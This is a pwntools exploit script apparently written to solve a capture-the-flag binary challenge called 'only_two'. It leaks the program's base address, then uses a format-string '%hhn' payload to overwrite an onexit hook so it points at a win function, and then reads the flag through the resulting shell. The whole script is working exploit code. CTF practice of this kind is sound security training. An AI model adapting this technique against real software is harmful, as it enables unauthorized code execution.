#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
set solib-search-path /home/kurlz/ctf/2025/cybercon/only_two/public_pwn_only-two
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
exe = "./chall_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

# Leak main with given function to calculate PIE address
sla(b"> ", b"1")
recvunt(b"main=")
leaked_main = int(io.recv(14).decode(), 16)
info(hex(leaked_main))
elf.address = leaked_main - 0x15a1
info(hex(elf.address))

win = elf.address + 0x10042

sla(b"> ", b"3") # Call given function to setup onexit_hook with proper address
sla(b"> ", b"1") # Leak address value stored in onexit_hook 

recvunt(b"hook=")
onexit = int(io.recv(14).decode(), 16)
info(hex(win - onexit))

# Use format string to partial overwrite last byte of onexit_hook -> win 
sla(b"> ", b"2")
sla(b'format? \n', f"%{win - onexit}x%hhn")

# Calling onexit_hook (now set to win)
sla(b"> ", b"3")
sl(b"cat flag.txt")
io.interactive()


